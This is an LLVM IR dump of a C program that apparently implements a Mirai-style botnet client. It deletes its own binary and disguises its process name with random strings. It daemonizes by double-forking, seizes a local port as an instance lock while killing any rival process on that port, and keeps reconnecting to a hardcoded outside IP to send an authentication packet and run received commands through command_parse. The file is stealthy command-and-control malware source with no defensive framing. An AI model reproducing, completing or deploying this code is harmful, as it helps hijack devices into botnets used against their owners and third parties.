; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.entry = type { i8, i8*, i16 }
%struct.relay = type { i8, i16, i16, i16, i16, i16, i16, [64 x i8] }
%struct.__sigset_t = type { [16 x i64] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }

@connected = dso_local global i8 0, align 1
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@LOCAL_ADDRESS = dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@fd = internal global i32 -1, align 4
@command_list = dso_local global [6 x %struct.command] zeroinitializer, align 16
@entry_list = dso_local global [24 x %struct.entry] zeroinitializer, align 16
@enable = internal global i32 1, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.relay, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [32 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca [64 x i8], align 16
  %15 = alloca %struct.__sigset_t, align 8
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.fd_set, align 8
  %18 = alloca %struct.timeval, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct.fd_set*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.fd_set*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca %struct.relay, align 2
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %13, align 4
  %29 = call i32 @sigemptyset(%struct.__sigset_t* %15) #8
  %30 = call i32 @sigaddset(%struct.__sigset_t* %15, i32 2) #8
  %31 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %15, %struct.__sigset_t* null) #8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @unlink(i8* %34) #8
  %36 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0)) #8
  %37 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #8
  %38 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #8
  %39 = call i32 @htonl(i32 2130706433) #9
  call void @ensure_bind(i32 %39)
  %40 = getelementptr inbounds [64 x i8], [64 x i8]* %14, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %40, i8 0, i64 64, i1 false)
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 2
  br i1 %42, label %43, label %55

43:                                               ; preds = %2
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i64 @strlen(i8* %46) #10
  %48 = icmp ult i64 %47, 64
  br i1 %48, label %49, label %55

49:                                               ; preds = %43
  %50 = getelementptr inbounds [64 x i8], [64 x i8]* %14, i64 0, i64 0
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i8* @strcpy(i8* %50, i8* %53) #8
  br label %55

55:                                               ; preds = %49, %43, %2
  %56 = call i32 @local_addr()
  store i32 %56, i32* @LOCAL_ADDRESS, align 4
  call void @init_rand()
  call void @init_entry()
  %57 = call i64 @write(i32 1, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 7)
  %58 = call i64 @write(i32 1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i64 1)
  %59 = call i32 @rand_new()
  %60 = urem i32 %59, 5
  %61 = add i32 %60, 10
  store i32 %61, i32* %11, align 4
  %62 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %63 = load i32, i32* %11, align 4
  call void @rand_string(i8* %62, i32 %63)
  %64 = load i32, i32* %11, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 %65
  store i8 0, i8* %66, align 1
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 0
  %69 = load i8*, i8** %68, align 8
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 0
  %72 = load i8*, i8** %71, align 8
  %73 = call i64 @strlen(i8* %72) #10
  call void @llvm.memset.p0i8.i64(i8* align 1 %69, i8 0, i64 %73, i1 false)
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 0
  %76 = load i8*, i8** %75, align 8
  %77 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %78 = call i8* @strcpy(i8* %76, i8* %77) #8
  %79 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %80 = load i32, i32* %11, align 4
  call void @rand_string(i8* %79, i32 %80)
  %81 = load i32, i32* %11, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 %82
  store i8 0, i8* %83, align 1
  %84 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %85 = call i32 (i32, ...) @prctl(i32 15, i8* %84) #8
  %86 = call i32 @fork() #8
  store i32 %86, i32* %9, align 4
  %87 = load i32, i32* %9, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %90

89:                                               ; preds = %55
  call void @exit(i32 1) #11
  unreachable

90:                                               ; preds = %55
  %91 = call i32 @fork() #8
  store i32 %91, i32* %10, align 4
  %92 = load i32, i32* %10, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %95

94:                                               ; preds = %90
  call void @exit(i32 1) #11
  unreachable

95:                                               ; preds = %90
  %96 = call i32 @setsid() #8
  %97 = call i32 @close(i32 0)
  %98 = call i32 @close(i32 1)
  %99 = call i32 @close(i32 2)
  call void @init_commands()
  %100 = getelementptr inbounds [64 x i8], [64 x i8]* %14, i64 0, i64 0
  call void @build_auth(%struct.relay* %8, i8* %100)
  br label %101

101:                                              ; preds = %95, %140, %149, %185, %215, %223, %256, %261, %269, %275, %280
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  br label %102

102:                                              ; preds = %101
  store %struct.fd_set* %16, %struct.fd_set** %22, align 8
  store i32 0, i32* %21, align 4
  br label %103

103:                                              ; preds = %113, %102
  %104 = load i32, i32* %21, align 4
  %105 = zext i32 %104 to i64
  %106 = icmp ult i64 %105, 16
  br i1 %106, label %107, label %116

107:                                              ; preds = %103
  %108 = load %struct.fd_set*, %struct.fd_set** %22, align 8
  %109 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %108, i32 0, i32 0
  %110 = load i32, i32* %21, align 4
  %111 = zext i32 %110 to i64
  %112 = getelementptr inbounds [16 x i64], [16 x i64]* %109, i64 0, i64 %111
  store i64 0, i64* %112, align 8
  br label %113

113:                                              ; preds = %107
  %114 = load i32, i32* %21, align 4
  %115 = add i32 %114, 1
  store i32 %115, i32* %21, align 4
  br label %103, !llvm.loop !6

116:                                              ; preds = %103
  br label %117

117:                                              ; preds = %116
  br label %118

118:                                              ; preds = %117
  store %struct.fd_set* %17, %struct.fd_set** %24, align 8
  store i32 0, i32* %23, align 4
  br label %119

119:                                              ; preds = %129, %118
  %120 = load i32, i32* %23, align 4
  %121 = zext i32 %120 to i64
  %122 = icmp ult i64 %121, 16
  br i1 %122, label %123, label %132

123:                                              ; preds = %119
  %124 = load %struct.fd_set*, %struct.fd_set** %24, align 8
  %125 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %124, i32 0, i32 0
  %126 = load i32, i32* %23, align 4
  %127 = zext i32 %126 to i64
  %128 = getelementptr inbounds [16 x i64], [16 x i64]* %125, i64 0, i64 %127
  store i64 0, i64* %128, align 8
  br label %129

129:                                              ; preds = %123
  %130 = load i32, i32* %23, align 4
  %131 = add i32 %130, 1
  store i32 %131, i32* %23, align 4
  br label %119, !llvm.loop !8

132:                                              ; preds = %119
  br label %133

133:                                              ; preds = %132
  %134 = load i32, i32* @fd, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %136, label %137

136:                                              ; preds = %133
  call void @establish_connection()
  br label %137

137:                                              ; preds = %136, %133
  %138 = load i32, i32* @fd, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %140, label %141

140:                                              ; preds = %137
  store i32 0, i32* %6, align 4
  call void @disconnect_connection()
  br label %101

141:                                              ; preds = %137
  %142 = call i32* @__errno_location() #9
  %143 = load i32, i32* %142, align 4
  %144 = icmp eq i32 %143, 101
  br i1 %144, label %149, label %145

145:                                              ; preds = %141
  %146 = call i32* @__errno_location() #9
  %147 = load i32, i32* %146, align 4
  %148 = icmp eq i32 %147, 22
  br i1 %148, label %149, label %150

149:                                              ; preds = %145, %141
  store i32 0, i32* %6, align 4
  call void @disconnect_connection()
  br label %101

150:                                              ; preds = %145
  %151 = load i8, i8* @connected, align 1
  %152 = icmp ne i8 %151, 0
  br i1 %152, label %153, label %165

153:                                              ; preds = %150
  %154 = load i32, i32* @fd, align 4
  %155 = srem i32 %154, 64
  %156 = zext i32 %155 to i64
  %157 = shl i64 1, %156
  %158 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %159 = load i32, i32* @fd, align 4
  %160 = sdiv i32 %159, 64
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds [16 x i64], [16 x i64]* %158, i64 0, i64 %161
  %163 = load i64, i64* %162, align 8
  %164 = or i64 %163, %157
  store i64 %164, i64* %162, align 8
  br label %177

165:                                              ; preds = %150
  %166 = load i32, i32* @fd, align 4
  %167 = srem i32 %166, 64
  %168 = zext i32 %167 to i64
  %169 = shl i64 1, %168
  %170 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %171 = load i32, i32* @fd, align 4
  %172 = sdiv i32 %171, 64
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [16 x i64], [16 x i64]* %170, i64 0, i64 %173
  %175 = load i64, i64* %174, align 8
  %176 = or i64 %175, %169
  store i64 %176, i64* %174, align 8
  br label %177

177:                                              ; preds = %165, %153
  %178 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 0, i64* %178, align 8
  %179 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 10, i64* %179, align 8
  %180 = load i32, i32* @fd, align 4
  %181 = add nsw i32 %180, 1
  %182 = call i32 @select(i32 %181, %struct.fd_set* %16, %struct.fd_set* %17, %struct.fd_set* null, %struct.timeval* %18)
  store i32 %182, i32* %19, align 4
  %183 = load i32, i32* %19, align 4
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

185:                                              ; preds = %177
  br label %101

186:                                              ; preds = %177
  %187 = load i32, i32* %19, align 4
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %189, label %196

189:                                              ; preds = %186
  %190 = load i32, i32* %6, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %6, align 4
  %192 = load i32, i32* %6, align 4
  %193 = icmp eq i32 %192, 6
  br i1 %193, label %194, label %195

194:                                              ; preds = %189
  store i32 0, i32* %6, align 4
  call void @send_query()
  br label %195

195:                                              ; preds = %194, %189
  br label %196

196:                                              ; preds = %195, %186
  %197 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %198 = load i32, i32* @fd, align 4
  %199 = sdiv i32 %198, 64
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds [16 x i64], [16 x i64]* %197, i64 0, i64 %200
  %202 = load i64, i64* %201, align 8
  %203 = load i32, i32* @fd, align 4
  %204 = srem i32 %203, 64
  %205 = zext i32 %204 to i64
  %206 = shl i64 1, %205
  %207 = and i64 %202, %206
  %208 = icmp ne i64 %207, 0
  br i1 %208, label %209, label %220

209:                                              ; preds = %196
  store i32 0, i32* %25, align 4
  store i32 4, i32* %26, align 4
  %210 = load i32, i32* @fd, align 4
  %211 = bitcast i32* %25 to i8*
  %212 = call i32 @getsockopt(i32 %210, i32 1, i32 4, i8* %211, i32* %26) #8
  %213 = load i32, i32* %25, align 4
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %215, label %216

215:                                              ; preds = %209
  store i32 0, i32* %6, align 4
  call void @disconnect_connection()
  br label %101

216:                                              ; preds = %209
  %217 = load i32, i32* @fd, align 4
  %218 = bitcast %struct.relay* %8 to i8*
  %219 = call i64 @send(i32 %217, i8* %218, i64 78, i32 16384)
  store i8 1, i8* @connected, align 1
  br label %220

220:                                              ; preds = %216, %196
  %221 = load i8, i8* @connected, align 1
  %222 = icmp ne i8 %221, 0
  br i1 %222, label %224, label %223

223:                                              ; preds = %220
  store i32 0, i32* %6, align 4
  call void @disconnect_connection()
  br label %101

224:                                              ; preds = %220
  %225 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %226 = load i32, i32* @fd, align 4
  %227 = sdiv i32 %226, 64
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [16 x i64], [16 x i64]* %225, i64 0, i64 %228
  %230 = load i64, i64* %229, align 8
  %231 = load i32, i32* @fd, align 4
  %232 = srem i32 %231, 64
  %233 = zext i32 %232 to i64
  %234 = shl i64 1, %233
  %235 = and i64 %230, %234
  %236 = icmp ne i64 %235, 0
  br i1 %236, label %237, label %280

237:                                              ; preds = %224
  store i8 0, i8* %27, align 1
  %238 = call i32* @__errno_location() #9
  store i32 0, i32* %238, align 4
  %239 = load i32, i32* @fd, align 4
  %240 = call i64 @recv(i32 %239, i8* %27, i64 1, i32 16386)
  %241 = trunc i64 %240 to i32
  store i32 %241, i32* %19, align 4
  %242 = load i32, i32* %19, align 4
  %243 = icmp eq i32 %242, -1
  br i1 %243, label %244, label %258

244:                                              ; preds = %237
  %245 = call i32* @__errno_location() #9
  %246 = load i32, i32* %245, align 4
  %247 = icmp eq i32 %246, 4
  br i1 %247, label %256, label %248

248:                                              ; preds = %244
  %249 = call i32* @__errno_location() #9
  %250 = load i32, i32* %249, align 4
  %251 = icmp eq i32 %250, 11
  br i1 %251, label %256, label %252

252:                                              ; preds = %248
  %253 = call i32* @__errno_location() #9
  %254 = load i32, i32* %253, align 4
  %255 = icmp eq i32 %254, 11
  br i1 %255, label %256, label %257

256:                                              ; preds = %252, %248, %244
  br label %101

257:                                              ; preds = %252
  store i32 0, i32* %19, align 4
  br label %258

258:                                              ; preds = %257, %237
  %259 = load i32, i32* %19, align 4
  %260 = icmp eq i32 %259, 0
  br i1 %260, label %261, label %262

261:                                              ; preds = %258
  store i32 0, i32* %6, align 4
  call void @disconnect_connection()
  br label %101

262:                                              ; preds = %258
  %263 = load i32, i32* @fd, align 4
  %264 = bitcast %struct.relay* %28 to i8*
  %265 = call i64 @recv(i32 %263, i8* %264, i64 78, i32 16384)
  %266 = trunc i64 %265 to i32
  store i32 %266, i32* %19, align 4
  %267 = load i32, i32* %19, align 4
  %268 = icmp eq i32 %267, 0
  br i1 %268, label %269, label %270

269:                                              ; preds = %262
  br label %101

270:                                              ; preds = %262
  %271 = getelementptr inbounds %struct.relay, %struct.relay* %28, i32 0, i32 0
  %272 = load i8, i8* %271, align 2
  %273 = zext i8 %272 to i32
  %274 = icmp eq i32 %273, 0
  br i1 %274, label %275, label %276

275:                                              ; preds = %270
  br label %101

276:                                              ; preds = %270
  %277 = getelementptr inbounds %struct.relay, %struct.relay* %28, i32 0, i32 7
  %278 = getelementptr inbounds [64 x i8], [64 x i8]* %277, i64 0, i64 0
  %279 = load i32, i32* %19, align 4
  call void @command_parse(i8* %278, i32 %279)
  br label %280

280:                                              ; preds = %276, %224
  br label %101
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @ensure_bind(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %8 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %2, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %9, i32* %6, align 4
  %10 = load i32, i32* %6, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @exit(i32 0) #11
  unreachable

13:                                               ; preds = %1
  %14 = load i32, i32* %6, align 4
  %15 = load i32, i32* %6, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0)
  %17 = or i32 2048, %16
  %18 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %17)
  %19 = load i32, i32* %6, align 4
  %20 = call i32 @setsockopt(i32 %19, i32 1, i32 2, i8* bitcast (i32* @enable to i8*), i32 4) #8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 3132) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %26 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %25, i32 0, i32 0
  store i32 %24, i32* %26, align 4
  %27 = call i32* @__errno_location() #9
  store i32 0, i32* %27, align 4
  %28 = load i32, i32* %6, align 4
  %29 = bitcast %union.__CONST_SOCKADDR_ARG* %7 to %struct.sockaddr**
  %30 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %30, %struct.sockaddr** %29, align 8
  %31 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %7, i32 0, i32 0
  %32 = load %struct.sockaddr*, %struct.sockaddr** %31, align 8
  %33 = call i32 @bind(i32 %28, %struct.sockaddr* %32, i32 16) #8
  store i32 %33, i32* %4, align 4
  %34 = call i32* @__errno_location() #9
  %35 = load i32, i32* %34, align 4
  store i32 %35, i32* %5, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %45

38:                                               ; preds = %13
  %39 = load i32, i32* %6, align 4
  %40 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %41 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %41, %struct.sockaddr** %40, align 8
  %42 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %43 = load %struct.sockaddr*, %struct.sockaddr** %42, align 8
  %44 = call i32 @connect(i32 %39, %struct.sockaddr* %43, i32 16)
  br label %45

45:                                               ; preds = %38, %13
  %46 = load i32, i32* %4, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %56

48:                                               ; preds = %45
  %49 = load i32, i32* %5, align 4
  %50 = icmp eq i32 %49, 99
  br i1 %50, label %51, label %56

51:                                               ; preds = %48
  %52 = load i32, i32* %6, align 4
  %53 = call i32 @close(i32 %52)
  %54 = call i32 @sleep(i32 1)
  %55 = load i32, i32* @LOCAL_ADDRESS, align 4
  call void @ensure_bind(i32 %55)
  br label %70

56:                                               ; preds = %48, %45
  %57 = load i32, i32* %4, align 4
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %67

59:                                               ; preds = %56
  %60 = load i32, i32* %5, align 4
  %61 = icmp eq i32 %60, 98
  br i1 %61, label %62, label %67

62:                                               ; preds = %59
  %63 = load i32, i32* %6, align 4
  %64 = call i32 @close(i32 %63)
  %65 = call i32 @sleep(i32 1)
  call void @terminate_process_via_port(i16 zeroext 3132)
  %66 = call i32 @htonl(i32 2130706433) #9
  call void @ensure_bind(i32 %66)
  br label %70

67:                                               ; preds = %59, %56
  %68 = load i32, i32* %6, align 4
  %69 = call i32 @listen(i32 %68, i32 1) #8
  br label %70

70:                                               ; preds = %67, %62, %51
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

declare i32 @local_addr() #5

declare void @init_rand() #5

declare void @init_entry() #5

declare i64 @write(i32, i8*, i64) #5

declare i32 @rand_new() #5

declare void @rand_string(i8*, i32) #5

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind
declare i32 @setsid() #1

declare i32 @close(i32) #5

declare void @init_commands() #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @build_auth(%struct.relay* %0, i8* %1) #0 {
  %3 = alloca %struct.relay*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [64 x i8], align 16
  %6 = alloca i16, align 2
  store %struct.relay* %0, %struct.relay** %3, align 8
  store i8* %1, i8** %4, align 8
  store i16 0, i16* %6, align 2
  %7 = load %struct.relay*, %struct.relay** %3, align 8
  call void @flush_relay(%struct.relay* %7)
  %8 = load %struct.relay*, %struct.relay** %3, align 8
  %9 = getelementptr inbounds %struct.relay, %struct.relay* %8, i32 0, i32 0
  store i8 2, i8* %9, align 2
  %10 = call zeroext i16 @htons(i16 zeroext 128) #9
  %11 = load %struct.relay*, %struct.relay** %3, align 8
  %12 = getelementptr inbounds %struct.relay, %struct.relay* %11, i32 0, i32 1
  store i16 %10, i16* %12, align 2
  %13 = call zeroext i16 @htons(i16 zeroext 90) #9
  %14 = load %struct.relay*, %struct.relay** %3, align 8
  %15 = getelementptr inbounds %struct.relay, %struct.relay* %14, i32 0, i32 2
  store i16 %13, i16* %15, align 2
  %16 = call zeroext i16 @htons(i16 zeroext 87) #9
  %17 = load %struct.relay*, %struct.relay** %3, align 8
  %18 = getelementptr inbounds %struct.relay, %struct.relay* %17, i32 0, i32 3
  store i16 %16, i16* %18, align 2
  %19 = call zeroext i16 @htons(i16 zeroext 200) #9
  %20 = load %struct.relay*, %struct.relay** %3, align 8
  %21 = getelementptr inbounds %struct.relay, %struct.relay* %20, i32 0, i32 4
  store i16 %19, i16* %21, align 2
  %22 = call zeroext i16 @htons(i16 zeroext 240) #9
  %23 = load %struct.relay*, %struct.relay** %3, align 8
  %24 = getelementptr inbounds %struct.relay, %struct.relay* %23, i32 0, i32 5
  store i16 %22, i16* %24, align 2
  %25 = call zeroext i16 @htons(i16 zeroext 30) #9
  %26 = load %struct.relay*, %struct.relay** %3, align 8
  %27 = getelementptr inbounds %struct.relay, %struct.relay* %26, i32 0, i32 6
  store i16 %25, i16* %27, align 2
  %28 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %29 = call i8* @strcpy(i8* %28, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0)) #8
  %30 = load i8*, i8** %4, align 8
  %31 = call i64 @strlen(i8* %30) #10
  %32 = icmp ugt i64 %31, 0
  br i1 %32, label %33, label %37

33:                                               ; preds = %2
  %34 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %35 = load i8*, i8** %4, align 8
  %36 = call i8* @strcpy(i8* %34, i8* %35) #8
  br label %37

37:                                               ; preds = %33, %2
  %38 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %39 = call i64 @strlen(i8* %38) #10
  %40 = trunc i64 %39 to i16
  store i16 %40, i16* %6, align 2
  %41 = load i16, i16* %6, align 2
  %42 = call zeroext i16 @htons(i16 zeroext %41) #9
  store i16 %42, i16* %6, align 2
  %43 = load %struct.relay*, %struct.relay** %3, align 8
  %44 = getelementptr inbounds %struct.relay, %struct.relay* %43, i32 0, i32 7
  %45 = getelementptr inbounds [64 x i8], [64 x i8]* %44, i64 0, i64 0
  %46 = bitcast i16* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 2 %45, i8* align 2 %46, i64 2, i1 false)
  %47 = load %struct.relay*, %struct.relay** %3, align 8
  %48 = getelementptr inbounds %struct.relay, %struct.relay* %47, i32 0, i32 7
  %49 = getelementptr inbounds [64 x i8], [64 x i8]* %48, i64 0, i64 0
  %50 = getelementptr inbounds i8, i8* %49, i64 2
  %51 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %52 = load i16, i16* %6, align 2
  %53 = call zeroext i16 @ntohs(i16 zeroext %52) #9
  %54 = zext i16 %53 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %50, i8* align 16 %51, i64 %54, i1 false)
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @establish_connection() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  %4 = call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %4, i32* @fd, align 4
  %5 = load i32, i32* @fd, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %8

7:                                                ; preds = %0
  br label %30

8:                                                ; preds = %0
  %9 = load i32, i32* @fd, align 4
  %10 = load i32, i32* @fd, align 4
  %11 = call i32 (i32, i32, ...) @fcntl(i32 %10, i32 3, i32 0)
  %12 = or i32 2048, %11
  %13 = call i32 (i32, i32, ...) @fcntl(i32 %9, i32 4, i32 %12)
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = call zeroext i16 @htons(i16 zeroext -4534) #9
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = call i32 @htonl(i32 -1129914491) #9
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  %22 = load i32, i32* %21, align 4
  store i32 %22, i32* %2, align 4
  %23 = call i32* @__errno_location() #9
  store i32 0, i32* %23, align 4
  %24 = load i32, i32* @fd, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %3 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %3, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @connect(i32 %24, %struct.sockaddr* %28, i32 16)
  br label %30

30:                                               ; preds = %8, %7
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @disconnect_connection() #0 {
  %1 = load i32, i32* @fd, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

3:                                                ; preds = %0
  %4 = load i32, i32* @fd, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

6:                                                ; preds = %3, %0
  store i32 -1, i32* @fd, align 4
  store i8 0, i8* @connected, align 1
  %7 = call i32 @sleep(i32 10)
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #2

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

